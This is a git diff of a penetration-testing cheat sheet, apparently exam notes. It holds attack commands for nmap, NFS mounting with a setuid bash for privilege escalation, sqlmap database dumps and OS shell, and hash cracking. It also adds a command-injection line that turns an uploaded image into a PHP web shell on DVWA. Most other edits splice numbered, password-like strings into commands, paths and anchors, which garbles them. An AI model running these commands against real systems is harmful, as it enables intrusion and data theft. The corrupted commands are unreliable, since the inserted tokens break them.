@@ -236,7 +236,7 @@ Wireshark, Hashcalc, Veracrypt, BCTextEncoder, Cryptool, Snow, OpenStego.
 
 ### Identify all active hosts in a network
 
-`nmap -sP <target_IP>/Subnet`
+`nmap -sP <target_IP#1#10.2.20348>/Subnet`
 
 ### Do a Stelth Scan, Invading firewall, IDS/IPS
 
@@ -248,7 +248,7 @@ To check target with open DB port (3306 or 1433): `nmap -sV IP/subnet` or `nmap 
 
 ### Locate IP address of the machine with RDP open port
 
-`nmap -Pn -p -sV 3389 <target_IP>`
+`nmap -Pn -p -sV 3389 <target_IP#3#2bb407ea >`
 
 #### prim <a href="#effd" id="effd"></a>
 
@@ -293,7 +293,7 @@ Exploiting misconfigured NFS (port 2049)
 
 * `nmap -sV —p 2049 IP/Subnet`
 * `sudo apt-get install nfs-common`
-* `nmap -sV —script=nfs-showmount <Target_IP>`
+* `nmap -sV —script=nfs-showmount <Target_IP#4#F!AgBr^V0 >`
 * check available mounts: `showmount -e <Target_IP>` -> we will see /home directory
 * `mkdir /tmp/nfs`
 * `sudo mount -t nfs 10.10.1.9:/home /tmp/nfs`&#x20;
@@ -302,7 +302,7 @@ Exploiting misconfigured NFS (port 2049)
 * `sudo chmod +s bash` -> it will be highlighted in red
 * `ls -la`
 * `sudo df -h`
-* `sudo chmod +s bash`&#x20;
+* `sudo chmod +s bash`&#x20#5#20207068;
 
 after them, In another terminal:
 
@@ -316,7 +316,7 @@ after them, In another terminal:
 
 ### Which machine started DOS attack? DDOS attack happened on which IP? Find out http crediantls from PCAP file?&#x20;
 
-**To find DOS (SYN and ACK) :**&#x20;
+**To find DOS (SYN and ACK) :**&#x20#6#H0m3@l0n3;
 
 * statistic -> IPv4 statistics -> source and destination address
 * filter using: `tcp.flags.syn == 1` or `tcp.flags.syn == 1 and tcp.flags.ack == 0` or filter to highest number of request
@@ -341,7 +341,7 @@ Or&#x20;
 
 get the statistics of ipv4 -> we can see that Packets B -> A are null, because the're not reply pack.
 
-**To find passwords :**&#x20;
+**To find passwords :**&#x20#7#maddy@777;
 
 `http.request.method == POST`
 
@@ -403,6 +403,8 @@ Copy the hash from responder to ntlmhash.txt
 
 and crack it using Hashcat or John
 
+Click on command injectio and type below command |copy C:\xampp\htdocs\DVWA\hackable\uploads\shell.jpeg C:\xampp\htdocs\DVWA\hackable\uploads\#14#B$#98TY#asdsa.php
+
 ## Hashcat
 
 * `hashcat -m 0 -a 0 hash.txt passwordlist.txt -m 0`
@@ -415,7 +417,7 @@ and crack it using Hashcat or John
 ## John the Ripper
 
 * `john —format-raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`&#x20;
-* `john /usr/share/responder/logs/SMB-NTLMv2-SSP-1.1.15.txt`
+* `john /usr/share/responder/logs/SMB-NT#8#h@ck3r00t#LMv2-SSP-1.1.15.txt`
 
 ## Hydra
 
@@ -482,7 +484,7 @@ gobuster dir -u http://IP:Port -w wordlist.txt
 
 ### **Finding vulnerable site**
 
-* site:[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) php?=&#x20;
+* site:[http://testphp.vulnweb.com/](http://testphp.vulnweb.com/) php?=&#x20#15#M@d(y535#;
 
 (for cookies- console->document.cookie)
 
@@ -506,7 +508,7 @@ Have cookie value is better, because reduce time to elaborate results!
 * `sqlmap -u` [`http://testphp.vulnweb.com/artists.php?artist=1`](http://testphp.vulnweb.com/artists.php?artist=1)  `-D acuart -T users -C pass  --dump`
 * `sqlmap -u "http://vmw.moviescope.com/viewprofile.aspx?id=l" —dbs [ Copy the cookie from website, mysql -U qdpmadmin -h 192.168.1.8 -P passwod [ If you have logins credentioals I`&#x20;
 * `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" --dbs`
-* Get list of tables -> `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" -D mysql --tables`
+* Get list of tables -> `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291#9#JH8754@! #cc8770da9561cea6811" -D mysql --tables`
 * Dump data from tables -> `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" -D mysql -T db --dump`
 * Get OS shell -> `sqlmap -u "http://1.1.1.3/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=d6f94e8c6e291cc8770da9561cea6811" --os-shell`
 
@@ -534,7 +536,7 @@ Have cookie value is better, because reduce time to elaborate results!
 * Insert how psw a potential keyword present into question
 * Click to Extract Data
 
-## CrypTool <a href="#effd" id="effd"></a>
+## CrypTool <a href="#effd" id="ef#10#5#fd"></a>
 
 ### Can you decrypt the file and provide the contents of "flag1.txt" as the answer? <a href="#effd" id="effd"></a>
 
@@ -563,7 +565,7 @@ set USERNAME admin
 
 ## Hashes.com <a href="#effd" id="effd"></a>
 
-### Decrypt/Crack the MD5 hash present into a website <a href="#effd" id="effd"></a>
+### Decrypt/Crack the MD5 hash present into a website <a href="#eff#16#y83r5EC#d" id="effd"></a>
 
 A file called "Secrethash.txt" has been uploaded via DVWA at http://192.168.1.10:8080/DVWA. The file is located at the following path: C:\wamp64\www\DVWA\hackable\uploads\Secret-Hash.txt. Your task is to crack the MD5 hash present in the file and reveal the original message. You can access the file by logging into DVWA using the provided credentials: superuser::superman.&#x20;
 
@@ -572,7 +574,7 @@ A file called "Secrethash.txt" has been uploaded via DVWA at http://192.168.1.10
 
 ## RDP <a href="#effd" id="effd"></a>
 
-#### Connect to RDP port <a href="#effd" id="effd"></a>
+#### Connect to RDP port <a href="#effd#17#H^(ker@EC#" id="effd"></a>
 
 ```bash
 xfreerdp /v:<Target_IP> /u:Administrator
@@ -592,7 +594,7 @@ Your objective is to find the secret number hidden inside the file and provide i
 
 ### Find suspicious account? You've a credential of one user, you can use RDP to log in e found suspicious account (port 3389). <a href="#effd" id="effd"></a>
 
-* Opening cmd and use: `net user` command.&#x20;
+* Opening cmd and use: `net user` command.&#x20#11#000c54ec;
 
 ### Check phone number of Maria <a href="#effd" id="effd"></a>
 
@@ -841,7 +843,7 @@ Download file from FTP
 * ip a - similar to ifconfig but shortest print
 * finger - gives you a short dump of info about a user
 
-#### Find command <a href="#automating-local-enumeration-1" id="automating-local-enumeration-1"></a>
+#### Find command <a href="#automating-local-enumeration-1-#13#qwertyuiop" id="automating-local-enumeration-1"></a>
 
 Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.
 
@@ -898,7 +900,7 @@ The example below is given to complete the subject on the “find” command.
 search -f flag.txt
 ```
 
-## Others resources <a href="#effd" id="effd"></a>
+## Others resources <a href="#effd#12#19554" id="effd"></a>
 
 ```
 >>>Module 02 : Enumeration 
